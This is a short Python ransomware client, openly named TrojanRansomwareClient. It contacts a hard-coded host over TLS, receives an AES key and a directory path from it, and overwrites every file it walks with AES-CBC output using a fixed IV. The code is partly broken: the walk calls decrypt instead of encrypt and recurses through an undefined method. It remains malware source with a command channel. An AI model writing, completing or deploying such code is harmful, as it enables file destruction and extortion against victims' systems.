import socket
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

target_ip = "10.100.102.18"
target_port = 8080

class TrojanRansomwareClient():

    def __init__(self, key):
        self.key = key
        self.iv = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
        self.backend = default_backend()


    def iterate_directory(self, path):
        for file in os.listdir(path):
            full_path = os.path.join(path, file)
            if os.path.isdir(full_path):
                self.scan_directory(full_path)
            else:
                data = self.read_file(full_path)
                self.decrypt_data(full_path)

    def read_file(self, file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
            return data
        
    def pad_data(self, data):
        padding_length = 16 - (len(data) % 16)
        padding = bytes([padding_length] * padding_length)
        return data + padding
    
    def unpad_data(self, padded_data):
        padding_length = padded_data[-1]  # last byte as int
        return padded_data[:-padding_length]


    def encrypt_data(self, data, file_path):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        data = self.pad_data(data)
        ciphertext = encryptor.update(data) + encryptor.finalize()
        with open(file_path, 'wb') as f:
            f.write(ciphertext)
    
    def decrypt_data(self, file_path):
        with open(file_path, 'rb') as f:
            ciphertext = f.read()
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
        decrypted_data = self.unpad_data(decrypted_data)
        with open(file_path, 'wb') as f:
            f.write(decrypted_data)




if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(r"C:\Program Files\OpenSSL-Win64\bin\cert.pem")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_client = context.wrap_socket(client, server_hostname="localhost")
    ssl_client.connect((target_ip, target_port))
    key = ssl_client.recv(1024)
    ransomware = TrojanRansomwareClient(key)
    dir_path = ssl_client.recv(1024)
    ransomware.iterate_directory(dir_path.decode())


    
    
